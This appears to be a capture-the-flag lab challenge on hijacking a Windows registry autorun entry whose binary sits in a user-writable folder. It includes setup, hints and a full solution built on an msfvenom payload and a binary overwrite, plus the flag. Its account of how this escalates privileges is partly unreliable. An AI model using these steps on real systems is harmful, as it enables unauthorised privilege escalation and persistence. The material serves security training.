# Challenge 3  Registry Autorun Hijack

**Difficulty:** Medium
**Category:** Windows Privilege Escalation
**Flag:** `C:\CTF\challenge_reg\flag.txt`

---

## Story

A system agent is configured to launch at startup via the Windows registry.
The binary it points to sits in a directory you happen to be able to write to.
Convince the machine to run your code at the next logon.

You are `ctfplayer`  a standard user.

---

## Setup

1. Start a **Windows VM**
2. Run PowerShell as Administrator:

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force
.\setup.ps1
```

3. Log in as `ctfplayer` / `Player123!`

> **Note:** Take a VM snapshot first. The autorun key fires at every logon,
> including for the Administrator account. Revert after completing the challenge.

---

## Background: Registry Autoruns

`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` contains programs that launch
automatically at logon for all users. Entries here often run with elevated privileges
when configured through Group Policy or startup scripts.

Unlike scheduled tasks or services, autorun persistence can be harder to spot.
Tools like Autoruns (Sysinternals), `reg query`, or `Get-ItemProperty` help enumerate them.

If an autorun entry points to a binary inside a directory writable by a low-privileged
user, replacing that binary is a clean privilege escalation path that fires on the next login.

---

## Hints

<details>
<summary>Hint 1</summary>
Enumerate autorun registry keys:

```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
Get-ItemProperty "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
```

Or with reg:
```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```
</details>

<details>
<summary>Hint 2</summary>
Note the path of the binary each entry points to.
Check your permissions on that binary and its parent directory:

```powershell
icacls "C:\ProgramData\SysAgent"
icacls "C:\ProgramData\SysAgent\agent.exe"
```
</details>

<details>
<summary>Hint 3</summary>
Generate a replacement binary, overwrite `agent.exe`, then trigger the autorun
by logging off and back in as `ctfplayer` (or rebooting the VM).
</details>

---

## Solution

<details>
<summary>Click to reveal  try on your own first!</summary>

### Step 1  Find the autorun entry

```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
```

Output:
```
SysAgent : "C:\ProgramData\SysAgent\agent.exe"
```

### Step 2  Check file permissions

```powershell
icacls "C:\ProgramData\SysAgent\agent.exe"
```

Output:
```
ctfplayer:(F)
```

Full control  we can overwrite the binary.

### Step 3  Generate the payload (on Kali)

```bash
msfvenom -p windows/x64/exec \
  CMD='cmd /c copy C:\CTF\challenge_reg\flag.txt C:\Users\Public\flag.txt && icacls C:\Users\Public\flag.txt /grant Everyone:F' \
  -f exe -o agent.exe
```

### Step 4  Replace the binary

Transfer `agent.exe` to the VM, then:

```powershell
Copy-Item agent.exe "C:\ProgramData\SysAgent\agent.exe" -Force
```

### Step 5  Trigger the autorun

Log off and log back in as `ctfplayer`.
The registry autorun fires at logon, executing your binary.

### Step 6  Read the flag

```powershell
type C:\Users\Public\flag.txt
```

```
CTF{r3g1stry_4ut0run_h1j4ck3d}
```

### Why this works

Autorun registry keys are a common persistence and privilege escalation vector.
The binary being pointed to must be protected  writable only by Administrators.
Always audit `HKLM\...\Run`, `HKCU\...\Run`, startup folders, and Winlogon keys
as part of a privilege escalation assessment. The Sysinternals Autoruns tool
highlights untrusted or unsigned autostart entries, making auditing straightforward.

</details>
